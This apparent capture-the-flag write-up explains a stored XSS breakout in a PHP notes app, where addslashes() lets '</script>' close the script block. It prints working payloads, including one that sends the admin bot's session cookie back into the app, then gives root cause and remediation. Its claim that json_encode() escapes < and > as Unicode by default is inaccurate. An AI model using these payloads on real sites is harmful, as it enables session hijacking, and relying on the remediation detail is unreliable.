### ScratchPad - Stored XSS via JavaScript String Context

> x Exam (51)


#### Vulnerability Class

> **Stored Cross-Site Scripting via JavaScript string context injection**, enabled by the use of PHP's `addslashes()` for escaping, which correctly handles `"`, `'`, `\`, and newline characters but fails to escape the `</script>` HTML closing tag sequence, allowing a complete breakout from the embedding `<script>` block.

#### Attack Surface Identification

The application exposes three surfaces upon inspection of `index.php` and `view.php`:

**Note creation form** posting to `index.php` with parameters `title` and `body` via `POST application/x-www-form-urlencoded`.

**Note view page** at `view.php?id=N`, which renders the stored note and embeds its body into a `<script>` block for the clipboard feature.

**Report to Admin button** on each note's view page, which internally calls `report.php` with a JSON POST body containing `{ "url": "http://app/view.php?id=N" }`, causing an admin bot running headless Chromium to visit the note with its authenticated session cookies attached.

#### Reconnaissance: Locating the Injection Context

A probe note was created with the body `"-alert(1)-"` and the page source of its view page was inspected. The HTML display context showed safe encoding:

```html
<div class="note-body-view">&quot;-alert(1)-&quot;</div>
```

However, the `<script>` block immediately below revealed the unprotected injection point:

```javascript
<!-- Share-to-clipboard feature: note body is embedded here for quick copy -->
<script>
  const note = "\"-alert(1)-\"";
  document.getElementById('copy').onclick = function() {
    navigator.clipboard.writeText(note)...
  };
</script>
```

The note body is reflected **raw and unescaped** inside a JavaScript string literal. The server applies `addslashes()`, which escapes `"` to `\"`, `\` to `\\`, and newlines to `\n`, but does **not** escape the `<` and `>` characters, meaning the HTML closing tag `</script>` passes through intact.

#### Understanding the Bypass: Why `addslashes()` Is Insufficient

The browser's **HTML parser runs before the JavaScript engine**. When the HTML parser encounters a `</script>` token inside a `<script>` block, it unconditionally closes the script element regardless of whether that token appears inside a JavaScript string literal. This is a fundamental property of the HTML parsing algorithm and cannot be mitigated by any amount of JavaScript-level string escaping. The correct defense requires escaping `<` to `\u003C` within `<script>` blocks, a step `addslashes()` does not perform.

#### Exploitation

##### Step 1: Confirming Code Execution

A note was created with the following body:

```
</script><script>alert(1)//
```

When the server embedded this into the script block, the resulting HTML was:

```html
<script>
  const note = "</script><script>alert(1)//"
```

The HTML parser closed the first `<script>` element at the `</script>` token, then opened a new `<script>` element, executing `alert(1)` in the origin context of the application. The alert dialog confirmed code execution on `8cf61d45-ed4d-4a72-acda-b0c3c0bf885d.offsec.m0lecon.it`.

##### Step 2: Identifying the Exfiltration Obstacles

Two obstacles were encountered during payload development.

The first obstacle was **network isolation**: an initial attempt used `fetch()` to exfiltrate `document.cookie` to an external `webhook.site` receiver. No request arrived, confirming that the admin bot operates on an isolated internal network with no outbound internet access. JavaScript running in the application origin can reach `http://app/` internally but cannot reach external hosts.

The second obstacle was **single quote escaping**: `addslashes()` escapes `'` to `\'`, corrupting any `fetch()` call whose string arguments use single quotes. The solution was to replace all single-quoted strings with **backtick template literals**, which `addslashes()` does not escape.

##### Step 3: Internal Exfiltration via Note Creation

Inspection of `index.php` revealed that note creation posts to `index.php` itself with `title` and `body` as `application/x-www-form-urlencoded` parameters. The admin bot can reach this endpoint internally at `http://app/index.php`. The final payload stored the admin's cookie as a new note body by issuing an authenticated POST request back to the application:

```
</script><script>fetch(`http://app/index.php`,{method:`POST`,headers:{[`Content-Type`]:`application/x-www-form-urlencoded`},body:`title=LEAKED&body=`+document.cookie})//
```

##### Step 4: Triggering the Attack Chain

The payload note was saved, receiving **Note #15** at `view.php?id=15`. The **Report to Admin** button on Note #15 was clicked, dispatching the internal URL `http://app/view.php?id=15` to the admin bot. The admin bot visited the note, the injected script executed in the correct origin, and a POST request was issued to `http://app/index.php` with the admin session cookie as the body. Refreshing `index.php` revealed a new note, **Note #16**, titled **LEAKED**, created at `2026-06-01 15:48:28`. Viewing Note #16 revealed its body:

```
flag=offsec{scr1pt_br34kout_9ZeTVhjwXdckEKzp}
```

#### Full Attack Chain Summary

```
Attacker saves malicious note (id=15)
        |
        v
Attacker clicks "Report to Admin" on Note #15
        |
        v
report.php dispatches { "url": "http://app/view.php?id=15" } to admin bot
        |
        v
Admin bot (headless Chromium) visits view.php?id=15 with session cookie
        |
        v
HTML parser closes <script> at </script> token
        |
        v
New <script> block executes fetch() in application origin
        |
        v
POST to http://app/index.php creates Note #16 with body = admin cookie
        |
        v
Attacker reads Note #16 → flag recovered
```

#### Root Cause Analysis

> The vulnerability arises from a **context mismatch in output encoding**. The developer correctly applied HTML entity encoding in the HTML display context but used PHP's `addslashes()` when embedding user content inside a `<script>` block. Because the HTML parser processes `</script>` before the JavaScript engine sees any string delimiters, `addslashes()` provides no protection against script tag injection. The correct remediation is to JSON-encode the value using `json_encode()` in PHP, which produces a properly escaped JavaScript string literal and encodes `<`, `>`, and `/` as Unicode escape sequences, rendering the `</script>` breakout vector impossible.

#### Remediation

The vulnerable PHP pattern:

```php
<script>
  const note = "<?= addslashes($body) ?>";
</script>
```

The correct PHP pattern:

```php
<script>
  const note = <?= json_encode($body) ?>;
</script>
```

`json_encode()` produces a fully quoted, properly escaped JavaScript string that encodes `<` as `\u003C`, `>` as `\u003E`, and `/` as `\u002F`, making `</script>` injection structurally impossible regardless of the input.


<img src="_attachments/ScratchPad%20-_2.png" width="300">

<img src="_attachments/ScratchPad%20-_3.png" width="300">

<img src="_attachments/ScratchPad%20-.png" width="300">

<img src="_attachments/ScratchPad%20-_4.png" width="300">